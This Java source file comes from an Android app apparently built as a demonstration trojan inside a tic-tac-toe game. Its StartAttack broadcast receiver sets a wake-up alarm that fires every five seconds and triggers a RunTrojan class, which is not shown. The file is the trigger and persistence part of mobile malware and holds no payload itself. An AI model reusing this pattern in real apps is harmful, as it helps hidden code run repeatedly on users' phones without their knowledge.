package com.example.maltictactoe.trojan;
import java.util.Calendar;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;
public class StartAttack extends BroadcastReceiver {
    private static final long TIME = 5000;//??how long?
    Calendar cal=Calendar.getInstance();
    private static int count=0;
    @Override
    public void onReceive(Context context, Intent arg1) {
        Log.i("StartAttack", "onReceive");
        AlarmManager service = (AlarmManager) context
                .getSystemService(Context.ALARM_SERVICE);
        Intent i = new Intent(context, RunTrojan.class);
//i.setAction("android.trojan.action.BC_ACTION");
        PendingIntent pending = PendingIntent.getBroadcast(context, 0, i,
                PendingIntent.FLAG_CANCEL_CURRENT);
        service.setInexactRepeating(AlarmManager.RTC_WAKEUP,
                cal.getTimeInMillis(), TIME, pending);
        Log.i("StartAttack", count++ +" times");
    }
}